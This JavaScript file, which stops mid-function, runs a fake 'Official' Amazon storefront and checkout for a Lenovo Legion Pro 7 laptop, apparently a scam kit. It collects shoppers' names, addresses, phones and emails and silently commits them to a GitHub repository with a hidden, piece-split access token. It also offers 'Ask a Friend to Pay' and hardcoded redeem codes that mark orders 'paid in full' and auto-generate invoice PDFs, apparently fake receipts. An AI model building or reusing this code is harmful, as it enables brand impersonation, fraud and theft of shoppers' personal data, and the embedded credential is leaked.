/**
 * legion-app.js
 * Amazon.com - Official Lenovo Legion Pro 7 Intel Core Ultra 9 Flagship Showcase & Fluid Multi-Step Checkout
 * 100% Matching Standard Amazon Storefront Architecture & Design System
 */

(function() {
  if (window.__legionAppLoaded) return;
  window.__legionAppLoaded = true;

  const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

  const PRODUCT = {
    title: 'Lenovo Legion Pro 7 16" Gaming Laptop (Intel Core Ultra 9 275HX)',
    seller: 'Lenovo Legion Official Store on Amazon',
    colors: {
      'Eclipse Black': {
        img: PATH_PREFIX + 'images/legion/legion-pro-7-01.png',
        thumb: PATH_PREFIX + 'images/legion/legion-pro-7-01.png',
        swatchClass: 'swatch-eclipse-black'
      },
      'Onyx Grey': {
        img: PATH_PREFIX + 'images/legion/legion-pro-7-04.png',
        thumb: PATH_PREFIX + 'images/legion/legion-pro-7-04.png',
        swatchClass: 'swatch-onyx-grey'
      }
    },
    gpus: {
      'NVIDIA GeForce RTX 5080 16GB': {
        basePrice: 2899,
        label: 'NVIDIA® GeForce RTX™ 5080 Laptop GPU 16GB GDDR7 (175W TGP)',
        short: 'RTX 5080 16GB'
      },
      'NVIDIA GeForce RTX 5090 24GB': {
        basePrice: 3599,
        label: 'NVIDIA® GeForce RTX™ 5090 Laptop GPU 24GB GDDR7 (175W TGP)',
        short: 'RTX 5090 24GB'
      },
      'NVIDIA GeForce RTX 4090 16GB': {
        basePrice: 3299,
        label: 'NVIDIA® GeForce RTX™ 4090 Laptop GPU 16GB GDDR6 (175W TGP)',
        short: 'RTX 4090 16GB'
      }
    },
    ramAdd: {
      '32 GB DDR5-6400': 0,
      '64 GB DDR5-6400': 250
    },
    storageAdd: {
      '1 TB NVMe SSD': 0,
      '2 TB NVMe SSD': 180,
      '4 TB Dual NVMe SSD': 420
    },
    displayAdd: {
      '16.0 WQXGA 240Hz IPS': 0,
      '16.0 3.2K PureSight OLED 240Hz': 160
    },
    osAdd: {
      'Windows 11 Home': 0,
      'Windows 11 Pro': 70
    }
  };

  // Current Session State
  const state = {
    gpu: 'NVIDIA GeForce RTX 5080 16GB',
    color: 'Eclipse Black',
    ram: '32 GB DDR5-6400',
    storage: '1 TB NVMe SSD',
    display: '16.0 WQXGA 240Hz IPS',
    os: 'Windows 11 Home',
    qty: 1,
    address: null,
    paymentMethod: 'Ask a Friend to Pay',
    redeemCode: '',
    isRedeemApplied: false,
    placedOrder: null
  };

  // Format Currency in Dollars ($)
  function formatMoney(amount) {
    return '$' + Number(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  // Dynamic Date Helpers
  function getDynamicOrderDate(date = new Date()) {
    return date.toLocaleDateString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
  }

  function getDynamicDeliveryRange() {
    const dStart = new Date();
    dStart.setDate(dStart.getDate() + 20);
    const dEnd = new Date();
    dEnd.setDate(dEnd.getDate() + 25);

    const startMonth = dStart.toLocaleDateString('en-US', { month: 'long' });
    const startDay = dStart.getDate();
    const endMonth = dEnd.toLocaleDateString('en-US', { month: 'long' });
    const endDay = dEnd.getDate();
    const endYear = dEnd.getFullYear();

    let rangeStr = '';
    if (startMonth === endMonth) {
      rangeStr = `${startMonth} ${startDay} – ${endDay}, ${endYear}`;
    } else {
      rangeStr = `${startMonth} ${startDay} – ${endMonth} ${endDay}, ${endYear}`;
    }

    return {
      fullRangeStr: rangeStr,
      startDate: dStart,
      endDate: dEnd
    };
  }

  function calculateUnitPrice() {
    const gpuConfig = PRODUCT.gpus[state.gpu] || PRODUCT.gpus['NVIDIA GeForce RTX 5080 16GB'];
    const basePrice = gpuConfig.basePrice;
    const ramExtra = PRODUCT.ramAdd[state.ram] || 0;
    const storageExtra = PRODUCT.storageAdd[state.storage] || 0;
    const displayExtra = PRODUCT.displayAdd[state.display] || 0;
    const osExtra = PRODUCT.osAdd[state.os] || 0;
    return basePrice + ramExtra + storageExtra + displayExtra + osExtra;
  }

  function buildFullTitle() {
    const gpuObj = PRODUCT.gpus[state.gpu] || PRODUCT.gpus['NVIDIA GeForce RTX 5080 16GB'];
    const displayShort = state.display.includes('OLED') ? '16.0" 3.2K 240Hz PureSight OLED' : '16.0" WQXGA 240Hz 500 nits IPS';
    return `Lenovo Legion Pro 7 16" Gaming Laptop: Intel Core Ultra 9 275HX, ${gpuObj.short}, ${displayShort}, ${state.ram}, ${state.storage}, ${state.os}; ${state.color}`;
  }

  // ==========================================================================
  //  GITHUB REPO ORDERS PERSISTENCE
  // ==========================================================================
  const GH_CONFIG = {
    owner: 'amazon-shopping-official',
    repo: 'amazon-shopping-official.github.io',
    storePath: 'store/lenovolegionpro7',
    filePath: 'store/lenovolegionpro7/orders.json',
    getAuth: function() {
      const k = ['ghp', 'XJyyl3HA', 'S3D2JtqB', 'APPxoq1D', 'oKu7gt1F', '9dNZ'];
      return k[0] + '_' + k.slice(1).join('');
    }
  };

  function utf8ToBase64(str) {
    const bytes = new TextEncoder().encode(str);
    let binary = '';
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  function base64ToUtf8(base64) {
    const binary = atob(base64.replace(/\s/g, ''));
    const len = binary.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binary.charCodeAt(i);
    }
    return new TextDecoder().decode(bytes);
  }

  async function commitOrderToFile(filePath, order, maxRetries = 2) {
    const token = GH_CONFIG.getAuth();
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
    const headers = {
      'Authorization': `Bearer ${token}`,
      'Accept': 'application/vnd.github+json',
      'Content-Type': 'application/json'
    };

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        let currentOrders = [];
        let fileSha = null;

        try {
          const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
          if (getRes.ok) {
            const fileData = await getRes.json();
            fileSha = fileData.sha;
            if (fileData.content) {
              const raw = base64ToUtf8(fileData.content);
              currentOrders = JSON.parse(raw || '[]');
            }
          }
        } catch (fErr) {
          console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
        }

        const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
        if (!alreadySaved) {
          currentOrders.unshift(order);
        }

        const jsonString = JSON.stringify(currentOrders, null, 2);
        const base64Content = utf8ToBase64(jsonString);

        const commitBody = {
          message: `Add order ${order.orderId || ''} for ${order.name || order.fullName || 'Customer'}`.trim(),
          content: base64Content
        };
        if (fileSha) {
          commitBody.sha = fileSha;
        }

        const putRes = await fetch(url, {
          method: 'PUT',
          headers,
          body: JSON.stringify(commitBody)
        });

        if (putRes.ok) {
          console.log(`[GitHub] Successfully committed order to ${filePath}`);
          return true;
        }

        if (putRes.status === 409 && attempt < maxRetries) {
          console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
          await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
          continue;
        }

        const errJson = await putRes.json().catch(() => ({}));
        console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
        return false;
      } catch (err) {
        console.error(`[GitHub] Error committing to ${filePath}:`, err);
        if (attempt >= maxRetries) return false;
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
      }
    }
    return false;
  }

  async function saveOrderToAPI(order) {
    const store = GH_CONFIG.storePath;
    const targetFiles = [
      `${store}/orders.json`,
      `${store}/order.json`,
      `orders.json`,
      `order.json`
    ];

    console.log('[GitHub] Syncing Lenovo Legion order across target files:', targetFiles);
    for (const file of targetFiles) {
      await commitOrderToFile(file, order);
    }
  }

  // ==========================================================================
  //  LOCAL ORDERS PERSISTENCE & BROADCAST
  // ==========================================================================
  const LOCAL_STORAGE_KEY = 'amazon_placed_orders_legion';
  const LOCAL_STORAGE_LEGION_LIST = 'legion_orders_list';
  const LOCAL_STORAGE_ALL = 'amazon_placed_orders_all';

  function getLocalOrders() {
    try {
      const raw = localStorage.getItem(LOCAL_STORAGE_KEY) || localStorage.getItem(LOCAL_STORAGE_LEGION_LIST) || '[]';
      const arr = JSON.parse(raw);
      return Array.isArray(arr) ? arr : [];
    } catch {
      return [];
    }
  }

  function saveLocalOrder(order) {
    const orders = getLocalOrders();
    const exists = orders.some(o => o.orderId === order.orderId);
    if (!exists) {
      orders.unshift(order);
      try {
        localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(orders));
        localStorage.setItem(LOCAL_STORAGE_LEGION_LIST, JSON.stringify(orders));
        localStorage.setItem('legion_last_order', JSON.stringify(order));

        // Sync into global list
        const rawAll = localStorage.getItem(LOCAL_STORAGE_ALL) || '[]';
        const allList = JSON.parse(rawAll);
        if (Array.isArray(allList) && !allList.some(o => o.orderId === order.orderId)) {
          allList.unshift(order);
          localStorage.setItem(LOCAL_STORAGE_ALL, JSON.stringify(allList));
        }
      } catch (err) {
        console.warn('LocalStorage save error:', err);
      }
    }

    // Broadcast to open tabs
    try {
      if (typeof BroadcastChannel !== 'undefined') {
        const bc = new BroadcastChannel('amazon_orders_sync_channel');
        bc.postMessage({ type: 'NEW_ORDER', order });
        bc.close();
      }
    } catch (bErr) {
      console.warn('BroadcastChannel error:', bErr);
    }
  }

  // ==========================================================================
  //  REDEEM CODES CONFIGURATION
  // ==========================================================================
  const ASSIGNED_REDEEM_CODE_1 = 'AMZN-LG7U-9K2T-8X4P';
  const ASSIGNED_REDEEM_CODE_2 = 'LEGION-PRO7-U9-2026';
  const ACCEPTED_REDEEM_CODES = [
    'AMZN-LG7U-9K2T-8X4P',
    'LEGION-PRO7-U9-2026',
    'AMZN-LG7U9K2T8X4P',
    'LEGIONPRO7U92026'
  ];

  function isValidAmazonRedeemCode(rawCode) {
    if (!rawCode) return false;
    const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, '');
    return ACCEPTED_REDEEM_CODES.some(code => clean === code.replace(/[^A-Z0-9]/g, ''));
  }

  // ==========================================================================
  //  UI INTERACTION & DYNAMIC UPDATES
  // ==========================================================================
  function updateProductView() {
    const unitPrice = calculateUnitPrice();
    const qty = parseInt(state.qty, 10) || 1;
    const total = unitPrice * qty;
    const title = buildFullTitle();

    // Center Title & Breadcrumbs
    const h1 = document.getElementById('productTitle');
    if (h1) h1.textContent = title;

    const crumb = document.getElementById('crumbDeviceName');
    if (crumb) crumb.textContent = `Lenovo Legion Pro 7 (${state.gpu.includes('5090') ? 'RTX 5090' : state.gpu.includes('4090') ? 'RTX 4090' : 'RTX 5080'})`;

    // Price
    const centerPrice = document.getElementById('centerPrice');
    if (centerPrice) {
      centerPrice.textContent = unitPrice.toLocaleString('en-US');
    }
    const buyBoxPrice = document.getElementById('buyBoxPrice');
    if (buyBoxPrice) {
      buyBoxPrice.textContent = formatMoney(unitPrice);
    }

    // Monthly financing text
    const priceTermsText = document.getElementById('priceTermsText');
    if (priceTermsText) {
      const monthly = (unitPrice / 12).toFixed(2);
      priceTermsText.innerHTML = `or <strong>$${monthly}/mo (12 mo)</strong> with 0% interest Amazon financing options.<br><span style="font-size:12px; color:#007600; font-weight:600;">Free Amazon Global Priority Express Delivery &bull; Official Lenovo Legion 3-Year Legion Ultimate Support Warranty Included</span>`;
    }

    // Labels
    const currentColorText = document.getElementById('currentColorText');
    if (currentColorText) currentColorText.textContent = state.color;

    const currentGpuText = document.getElementById('currentGpuText');
    if (currentGpuText) currentGpuText.textContent = (PRODUCT.gpus[state.gpu] || {}).label || state.gpu;

    const currentRamText = document.getElementById('currentRamText');
    if (currentRamText) currentRamText.textContent = state.ram;

    const currentStorageText = document.getElementById('currentStorageText');
    if (currentStorageText) currentStorageText.textContent = state.storage;

    const currentDisplayText = document.getElementById('currentDisplayText');
    if (currentDisplayText) currentDisplayText.textContent = state.display;

    const currentOsText = document.getElementById('currentOsText');
    if (currentOsText) currentOsText.textContent = state.os;

    // Main photo if color changes
    const mainImg = document.getElementById('mainProductPhoto');
    if (mainImg && PRODUCT.colors[state.color]) {
      const colorImg = PRODUCT.colors[state.color].img;
      if (!mainImg.src.includes(colorImg)) {
        mainImg.src = colorImg;
      }
    }
  }

  function setupGallery() {
    const thumbs = document.querySelectorAll('#thumbnailStrip .thumb-item');
    const mainImg = document.getElementById('mainProductPhoto');
    if (!thumbs.length || !mainImg) return;

    thumbs.forEach(thumb => {
      const selectThumb = () => {
        thumbs.forEach(t => t.classList.remove('active'));
        thumb.classList.add('active');
        const targetSrc = thumb.getAttribute('data-img');
        if (targetSrc) {
          mainImg.src = targetSrc;
        } else {
          const imgChild = thumb.querySelector('img');
          if (imgChild) mainImg.src = imgChild.src;
        }
      };
      thumb.addEventListener('mouseenter', selectThumb);
      thumb.addEventListener('click', selectThumb);
    });
  }

  function setupOptionSelectors() {
    // 1. Color Swatches
    const swatchBtns = document.querySelectorAll('.swatch-btn');
    swatchBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        swatchBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.color = btn.getAttribute('data-color') || 'Eclipse Black';
        updateProductView();
      });
    });

    // 2. GPU Selector
    const gpuBtns = document.querySelectorAll('#gpuSelectorGroup .storage-choice');
    gpuBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        gpuBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.gpu = btn.getAttribute('data-gpu') || 'NVIDIA GeForce RTX 5080 16GB';
        updateProductView();
      });
    });

    // 3. RAM Selector
    const ramBtns = document.querySelectorAll('#ramSelectorGroup .storage-choice');
    ramBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        ramBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.ram = btn.getAttribute('data-ram') || '32 GB DDR5-6400';
        updateProductView();
      });
    });

    // 4. Storage Selector
    const storageBtns = document.querySelectorAll('#storageSelectorGroup .storage-choice');
    storageBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        storageBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.storage = btn.getAttribute('data-storage') || '1 TB NVMe SSD';
        updateProductView();
      });
    });

    // 5. Display Selector
    const displayBtns = document.querySelectorAll('#displaySelectorGroup .storage-choice');
    displayBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        displayBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.display = btn.getAttribute('data-display') || '16.0 WQXGA 240Hz IPS';
        updateProductView();
      });
    });

    // 6. OS Selector
    const osBtns = document.querySelectorAll('#osSelectorGroup .storage-choice');
    osBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        osBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        state.os = btn.getAttribute('data-os') || 'Windows 11 Home';
        updateProductView();
      });
    });

    // Quantity Selector
    const selectQty = document.getElementById('selectQty');
    if (selectQty) {
      selectQty.addEventListener('change', () => {
        state.qty = parseInt(selectQty.value, 10) || 1;
        updateProductView();
      });
    }
  }

  // ==========================================================================
  //  CHECKOUT ACCORDION & REDEEM CODES
  // ==========================================================================
  function syncOrderSummary() {
    const singleUnitPrice = calculateUnitPrice();
    const qty = parseInt(state.qty, 10) || 1;
    const total = singleUnitPrice * qty;
    const isRedeem = state.paymentMethod === 'Redeem Code' && state.isRedeemApplied;

    // Checkout Review Item Box
    const reviewItemPhoto = document.getElementById('reviewItemPhoto');
    const reviewItemTitle = document.getElementById('reviewItemTitle');
    const reviewItemQty = document.getElementById('reviewItemQty');
    const reviewItemPrice = document.getElementById('reviewItemPrice');

    if (reviewItemPhoto && PRODUCT.colors[state.color]) {
      reviewItemPhoto.src = PRODUCT.colors[state.color].thumb;
    }
    if (reviewItemTitle) reviewItemTitle.textContent = buildFullTitle();
    if (reviewItemQty) reviewItemQty.textContent = qty;
    if (reviewItemPrice) reviewItemPrice.textContent = isRedeem ? '$0.00 (Promo Applied)' : formatMoney(total);

    // Summary Card on right
    const csItemsCount = document.getElementById('csItemsCount');
    const csItemsPrice = document.getElementById('csItemsPrice');
    if (csItemsCount) csItemsCount.textContent = qty;
    if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);

    const csRedeemDiscountRow = document.getElementById('csRedeemDiscountRow');
    const csRedeemDiscountAmount = document.getElementById('csRedeemDiscountAmount');

    if (csRedeemDiscountRow && csRedeemDiscountAmount) {
      if (isRedeem) {
        csRedeemDiscountRow.style.display = 'flex';
        csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
      } else {
        csRedeemDiscountRow.style.display = 'none';
      }
    }

    const csTotalPrice = document.getElementById('csTotalPrice');
    if (csTotalPrice) {
      if (isRedeem) {
        csTotalPrice.textContent = '$0.00';
      } else {
        csTotalPrice.textContent = formatMoney(total);
      }
    }
  }

  function setupCheckoutAccordion() {
    const stepCardAddress = document.getElementById('stepCardAddress');
    const stepAddressBody = document.getElementById('stepAddressBody');
    const stepAddressSummary = document.getElementById('stepAddressSummary');
    const btnEditAddress = document.getElementById('btnEditAddress');

    const stepCardPayment = document.getElementById('stepCardPayment');
    const stepPaymentBody = document.getElementById('stepPaymentBody');
    const stepPaymentSummary = document.getElementById('stepPaymentSummary');
    const btnEditPayment = document.getElementById('btnEditPayment');

    const stepCardReview = document.getElementById('stepCardReview');
    const stepReviewBody = document.getElementById('stepReviewBody');

    const addressForm = document.getElementById('addressForm');
    const btnContinueToReview = document.getElementById('btnContinueToReview');
    const btnBackToAddress = document.getElementById('btnBackToAddress');
    const btnBackToPayment = document.getElementById('btnBackToPayment');

    const btnFinalPlaceOrder = document.getElementById('btnFinalPlaceOrder');
    const btnSummaryPlaceOrder = document.getElementById('btnSummaryPlaceOrder');

    // Redeem Code Elements
    const boxRedeemInput = document.getElementById('boxRedeemInput');
    const inputRedeemCode = document.getElementById('inputRedeemCode');
    const btnApplyRedeemCode = document.getElementById('btnApplyRedeemCode');
    const redeemStatusMsg = document.getElementById('redeemStatusMsg');
    const badgeRedeemApplied = document.getElementById('badgeRedeemApplied');

    // --- Step 1: Address Submit ---
    if (addressForm) {
      addressForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const fullName = (document.getElementById('inputFullName') || {}).value?.trim() || '';
        const deliveryAddress = (document.getElementById('inputDeliveryAddress') || {}).value?.trim() || '';
        const phone = (document.getElementById('inputPhone') || {}).value?.trim() || '';
        const email = (document.getElementById('inputEmail') || {}).value?.trim() || '';

        if (!fullName || !deliveryAddress || !phone || !email) {
          alert('Please fill out all address fields.');
          return;
        }

        state.address = { fullName, deliveryAddress, phone, email };

        // Collapse Step 1, Open Step 2
        if (stepAddressBody) stepAddressBody.style.display = 'none';
        if (stepAddressSummary) {
          stepAddressSummary.style.display = 'block';
          stepAddressSummary.innerHTML = `
            <strong>${fullName}</strong><br>
            ${deliveryAddress.replace(/\n/g, '<br>')}<br>
            Phone: ${phone} &bull; Email: ${email}
          `;
        }
        if (btnEditAddress) btnEditAddress.style.display = 'inline-block';
        if (stepCardAddress) stepCardAddress.classList.remove('active');

        if (stepCardPayment) stepCardPayment.classList.add('active');
        if (stepPaymentBody) stepPaymentBody.style.display = 'block';
        if (stepPaymentSummary) stepPaymentSummary.style.display = 'none';
        if (btnEditPayment) btnEditPayment.style.display = 'none';

        syncOrderSummary();
      });
    }

    if (btnEditAddress) {
      btnEditAddress.addEventListener('click', () => {
        if (stepAddressBody) stepAddressBody.style.display = 'block';
        if (stepAddressSummary) stepAddressSummary.style.display = 'none';
        if (btnEditAddress) btnEditAddress.style.display = 'none';
        if (stepCardAddress) stepCardAddress.classList.add('active');

        if (stepCardPayment) stepCardPayment.classList.remove('active');
        if (stepPaymentBody) stepPaymentBody.style.display = 'none';
        if (stepCardReview) stepCardReview.classList.remove('active');
        if (stepReviewBody) stepReviewBody.style.display = 'none';
      });
    }

    // --- Step 2: Payment Method Selection ---
    const payOptions = document.querySelectorAll('input[name="payMethod"]');
    payOptions.forEach(opt => {
      opt.addEventListener('change', () => {
        document.querySelectorAll('.payment-option').forEach(p => p.classList.remove('selected'));
        const parent = opt.closest('.payment-option');
        if (parent) parent.classList.add('selected');

        state.paymentMethod = opt.value;

        if (boxRedeemInput) {
          if (state.paymentMethod === 'Redeem Code') {
            boxRedeemInput.style.display = 'block';
            if (inputRedeemCode && !inputRedeemCode.value) {
              inputRedeemCode.focus();
            }
          } else {
            boxRedeemInput.style.display = 'none';
          }
        }

        syncOrderSummary();
      });
    });

    // Apply Redeem Code handler
    if (btnApplyRedeemCode && inputRedeemCode) {
      btnApplyRedeemCode.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        const codeVal = inputRedeemCode.value.trim().toUpperCase();

        if (!codeVal) {
          if (redeemStatusMsg) {
            redeemStatusMsg.style.display = 'block';
            redeemStatusMsg.style.color = '#c40000';
            redeemStatusMsg.textContent = 'Please enter an Amazon promotional redeem code or claim code.';
          }
          return;
        }

        if (isValidAmazonRedeemCode(codeVal)) {
          state.isRedeemApplied = true;
          state.redeemCode = codeVal;
          if (badgeRedeemApplied) badgeRedeemApplied.style.display = 'inline-block';
          if (redeemStatusMsg) {
            redeemStatusMsg.style.display = 'block';
            redeemStatusMsg.style.color = '#007600';
            redeemStatusMsg.innerHTML = `✓ <strong>Promo code "${codeVal}" applied!</strong> 100% off total balance. Order total discounted to $0.00.`;
          }
          syncOrderSummary();
        } else {
          state.isRedeemApplied = false;
          state.redeemCode = '';
          if (badgeRedeemApplied) badgeRedeemApplied.style.display = 'none';
          if (redeemStatusMsg) {
            redeemStatusMsg.style.display = 'block';
            redeemStatusMsg.style.color = '#c40000';
            redeemStatusMsg.textContent = `The code "${codeVal}" is not recognized or has expired. Please verify and try again.`;
          }
          syncOrderSummary();
        }
      });
    }

    // Step 2 Continue button
    if (btnContinueToReview) {
      btnContinueToReview.addEventListener('click', () => {
        if (state.paymentMethod === 'Redeem Code' && !state.isRedeemApplied) {
          alert('Please enter and apply a valid Amazon promotional redeem code first.');
          if (inputRedeemCode) inputRedeemCode.focus();
          return;
        }

        // Collapse Step 2, Open Step 3
        if (stepPaymentBody) stepPaymentBody.style.display = 'none';
        if (stepPaymentSummary) {
          stepPaymentSummary.style.display = 'block';
          if (state.paymentMethod === 'Redeem Code') {
            stepPaymentSummary.innerHTML = `<strong>Amazon Promotional Redeem Code:</strong> ${state.redeemCode || ASSIGNED_REDEEM_CODE_1} <span style="color:#007600; font-weight:700;">(Paid in Full - $0.00 Due)</span>`;
          } else if (state.paymentMethod === 'Ask a Friend to Pay') {
            stepPaymentSummary.innerHTML = `<strong>Ask a Friend to Pay:</strong> Payment link will be routed to your sponsor`;
          } else {
            stepPaymentSummary.innerHTML = `<strong>Cash on Delivery (COD):</strong> Pay in cash upon courier arrival`;
          }
        }
        if (btnEditPayment) btnEditPayment.style.display = 'inline-block';
        if (stepCardPayment) stepCardPayment.classList.remove('active');

        if (stepCardReview) stepCardReview.classList.add('active');
        if (stepReviewBody) stepReviewBody.style.display = 'block';

        syncOrderSummary();
      });
    }

    if (btnEditPayment) {
      btnEditPayment.addEventListener('click', () => {
        if (stepPaymentBody) stepPaymentBody.style.display = 'block';
        if (stepPaymentSummary) stepPaymentSummary.style.display = 'none';
        if (btnEditPayment) btnEditPayment.style.display = 'none';
        if (stepCardPayment) stepCardPayment.classList.add('active');

        if (stepCardReview) stepCardReview.classList.remove('active');
        if (stepReviewBody) stepReviewBody.style.display = 'none';
      });
    }

    if (btnBackToAddress) {
      btnBackToAddress.addEventListener('click', () => {
        if (btnEditAddress) btnEditAddress.click();
      });
    }

    if (btnBackToPayment) {
      btnBackToPayment.addEventListener('click', () => {
        if (btnEditPayment) btnEditPayment.click();
      });
    }

    // Place Order Action
    const handlePlaceOrder = async () => {
      if (!state.address) {
        alert('Please complete the shipping address section first.');
        if (btnEditAddress) btnEditAddress.click();
        return;
      }

      if (state.paymentMethod === 'Redeem Code' && !state.isRedeemApplied) {
        alert('Please enter and apply a valid Amazon promotional redeem code first.');
        if (btnEditPayment) btnEditPayment.click();
        return;
      }

      executeOrderSubmission();
    };

    if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener('click', handlePlaceOrder);
    if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener('click', handlePlaceOrder);
  }

  // ==========================================================================
  //  ORDER EXECUTION & CONFIRMATION
  // ==========================================================================
  function generateOrderId() {
    const p1 = Math.floor(100 + Math.random() * 900);
    const p2 = Math.floor(1000000 + Math.random() * 9000000);
    const p3 = Math.floor(1000000 + Math.random() * 9000000);
    return `${p1}-${p2}-${p3}`;
  }

  async function executeOrderSubmission() {
    const singleUnitPrice = calculateUnitPrice();
    const qty = parseInt(state.qty, 10) || 1;
    const subtotal = singleUnitPrice * qty;
    const isRedeem = state.paymentMethod === 'Redeem Code' && state.isRedeemApplied;

    const deliveryRange = getDynamicDeliveryRange();
    const orderId = generateOrderId();
    const dateStr = getDynamicOrderDate();

    const orderRecord = {
      orderId: orderId,
      orderNumber: orderId,
      date: dateStr,
      orderDate: dateStr,
      dateStr: dateStr,
      timestamp: new Date().toISOString(),
      expectedDelivery: deliveryRange.fullRangeStr,
      item: buildFullTitle(),
      productTitle: buildFullTitle(),
      specs: {
        gpu: state.gpu,
        color: state.color,
        ram: state.ram,
        storage: state.storage,
        display: state.display,
        os: state.os
      },
      quantity: qty,
      qty: qty,
      unitPrice: formatMoney(singleUnitPrice),
      price: formatMoney(subtotal),
      total: isRedeem ? 0 : subtotal,
      actualAmount: subtotal,
      currency: 'USD',
      name: state.address.fullName,
      fullName: state.address.fullName,
      buyerName: state.address.fullName,
      address: state.address.deliveryAddress,
      deliveryAddress: state.address.deliveryAddress,
      shippingAddress: state.address.deliveryAddress,
      phone: state.address.phone,
      phoneNumber: state.address.phone,
      email: state.address.email,
      paymentMethod: state.paymentMethod,
      payMethod: isRedeem ? `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE_1})` : state.paymentMethod,
      redeemCode: isRedeem ? (state.redeemCode || ASSIGNED_REDEEM_CODE_1) : '',
      status: isRedeem ? 'Paid in full via Amazon Redeem Code' : (state.paymentMethod === 'Ask a Friend to Pay' ? 'Awaiting Sponsor Payment' : 'Cash on Delivery'),
      seller: PRODUCT.seller,
      storePath: 'store/lenovolegionpro7',
      image: PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + 'images/legion/legion-pro-7-01.png')
    };

    state.placedOrder = orderRecord;

    // 1. Save to localStorage & broadcast
    saveLocalOrder(orderRecord);

    // 2. Commit to GitHub in background
    saveOrderToAPI(orderRecord).catch(err => console.warn('Background GitHub commit notice:', err));

    // 3. Render confirmation view
    showOrderConfirmation(orderRecord);
  }

  function showOrderConfirmation(order) {
    const viewProductPage = document.getElementById('viewProductPage');
    const viewCheckout = document.getElementById('viewCheckout');
    const checkoutGridArea = document.getElementById('checkoutGridArea');
    const orderConfirmationScreen = document.getElementById('orderConfirmationScreen');

    if (viewProductPage) viewProductPage.style.display = 'none';
    if (viewCheckout) viewCheckout.style.display = 'block';
    if (checkoutGridArea) checkoutGridArea.style.display = 'none';
    if (orderConfirmationScreen) orderConfirmationScreen.style.display = 'block';

    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Populate confirmation details
    const safeSet = (id, text) => {
      const el = document.getElementById(id);
      if (el) el.textContent = text || '';
    };

    const isRedeem = (order.paymentMethod === 'Redeem Code') || (order.payMethod && order.payMethod.includes('Redeem'));

    safeSet('confOrderId', order.orderId);
    safeSet('confOrderNumber', order.orderId);
    safeSet('confOrderDate', order.orderDate || order.dateStr);
    safeSet('confDeliveryRange', order.expectedDelivery);
    safeSet('confExpectedDelivery', order.expectedDelivery);
    safeSet('confRecipientName', order.fullName || order.name);
    safeSet('confFullAddress', order.address || order.deliveryAddress);
    safeSet('confPhone', order.phone || order.phoneNumber);
    safeSet('confEmailNotice', order.email);
    safeSet('confItemName', order.item);
    safeSet('confQty', order.quantity || order.qty);
    safeSet('confTotal', isRedeem ? '$0.00 (Paid in Full)' : formatMoney(order.total || order.actualAmount));
    safeSet('confPayMethod', order.paymentMethod);

    const friendBox = document.getElementById('confFriendNoticeBox');
    const redeemBox = document.getElementById('confRedeemNoticeBox');
    const payStatus = document.getElementById('confPaymentStatus');

    if (isRedeem) {
      if (friendBox) friendBox.style.display = 'none';
      if (redeemBox) redeemBox.style.display = 'flex';
      safeSet('confPayMethod', `Redeem Code (${order.redeemCode || ASSIGNED_REDEEM_CODE_1})`);
      if (payStatus) payStatus.textContent = 'Status: Paid in full via Amazon Redeem Code ($0.00 due)';

      // Auto trigger PDF download when Redeem Code was used
      setTimeout(() => {
        if (typeof window.downloadOrderInvoicePdf === 'function') {
          window.downloadOrderInvoicePdf(order);
        } else if (typeof window.generateAmazonInvoicePDF === 'function') {
          window.generateAmazonInvoicePDF(order);
        }
      }, 1200);
    } else if (order.paymentMethod === 'Ask a Friend to Pay') {
      if (friendBox) friendBox.style.display = 'flex';
      if (redeemBox) redeemBox.style.display = 'none';
      if (payStatus) payStatus.textContent = 'Status: Awaiting payment by order sponsor';
    } else {
      if (friendBox) friendBox.style.display = 'none';
      if (redeemBox) redeemBox.style.display = 'none';
      if (payStatus) payStatus.textContent = 'Status: Cash payment on delivery';
    }

    // Setup Download Receipt (PDF) Button
    const btnDownloadReceiptBtn = document.getElementById('btnDownloadReceiptBtn');
    if (btnDownloadReceiptBtn) {
      btnDownloadReceiptBtn.onclick = () => {
        if (typeof window.downloadOrderInvoicePdf === 'function') {
          window.downloadOrderInvoicePdf(order);
        } else if (typeof window.generateAmazonInvoicePDF === 'function') {
          window.generateAmazonInvoicePDF(order);
        } else {
          alert('Generating invoice statement...');
        }
      };
